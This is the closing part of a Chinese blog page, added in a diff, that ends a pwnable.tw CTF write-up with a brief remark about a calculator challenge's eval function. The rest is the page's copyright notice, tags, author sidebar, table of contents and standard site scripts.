+<p>我们进eval函数里简单看一下</p>
+<p><img src="https://i.loli.net/2020/09/01/PhLB26KCVqea5Zj.png" alt="image.png"></p>
+<p>粗略看了一下大概可以知道eval函数是用来进行运算的函数，</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    arttnba3
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/" title="【CTF题解-0x02】pwnable.tw write up by arttnb3">http://archive.next.arttnba3.cn/2020/08/17/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x02%E3%80%91pwnable-tw-write-up-by-arttnb3/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" <i class="fa fa-tag"></i> 信息安全</a>
+          
+            <a href="/tags/PWN/" <i class="fa fa-tag"></i> PWN</a>
+          
+            <a href="/tags/ret2shellcode/" <i class="fa fa-tag"></i> ret2shellcode</a>
+          
+            <a href="/tags/python/" <i class="fa fa-tag"></i> python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/19/%E3%80%90%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-0x03%E3%80%91%E6%B1%82%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91%E2%80%94%E2%80%94Kruskal%E7%AE%97%E6%B3%95%E4%B8%8EPrim%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90-by-arttnba3/" rel="next" title="【算法浅析-0x03】求最小生成树——Kruskal算法与Prim算法浅析 by arttnba3">
+                <i class="fa fa-chevron-left"></i> 【算法浅析-0x03】求最小生成树——Kruskal算法与Prim算法浅析 by arttnba3
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/06/%E3%80%90OJ-0x0002-Leetcode%E3%80%91%E6%A0%88%E9%83%A8%E5%88%86write-up-by-arttnba3/" rel="prev" title="【OJ-0x0002-Leetcode】栈部分write up by arttnba3">
+                【OJ-0x0002-Leetcode】栈部分write up by arttnba3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+  
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="arttnba3" />
+            
+              <p class="site-author-name" itemprop="name">arttnba3</p>
+              <p class="site-description motion-element" itemprop="description">- 想成为你心目中的第一啊 -</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/arttnba3" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1543127579@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://wpa.qq.com/msgrd?v=3&uin=1543127579&site=qq&menu=yes" target="_blank" title="QQ">
+                      
+                        <i class="fa fa-fw fa-qq"></i>QQ</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/arttnba3" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://stackoverflow.com/users/13389180/arttnba3" target="_blank" title="StackOverflow">
+                      
+                        <i class="fa fa-fw fa-stack-overflow"></i>StackOverflow</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://plus.google.com/arttnba" target="_blank" title="Google">
+                      
+                        <i class="fa fa-fw fa-google"></i>Google</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Friends' Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.wootec.top" title="Reverier" target="_blank">Reverier</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://luoq1an.github.io" title="luoqian" target="_blank">luoqian</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ll1ng.github.io" title="ling" target="_blank">ling</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shal10w.github.io" title="shallow" target="_blank">shallow</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn" title="eqqie" target="_blank">eqqie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cor1e.cn" title="cor1e" target="_blank">cor1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://yunq1ao.com" title="yunqiao" target="_blank">yunqiao</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mercer5.github.io" title="mercer" target="_blank">mercer</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-绪论"><span class="nav-number">1.</span> <span class="nav-text">0x00.绪论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-start"><span class="nav-number">2.</span> <span class="nav-text">0x01.start</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-orw"><span class="nav-number">3.</span> <span class="nav-text">0x02.orw</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-CVE-2018-1160（×）"><span class="nav-number">4.</span> <span class="nav-text">0x03.CVE-2018-1160（×）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-calc"><span class="nav-number">5.</span> <span class="nav-text">0x04.calc</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">arttnba3</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">90.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  <script src="/js/src/md5.min.js"></script>
+
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '',
+          clientSecret: '',
+          repo: 'BlogComment',
+          owner: '',
+          admin: [''],
+
+          id: md5(location.pathname),
+
+          distractionFreeMode: 'false'
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
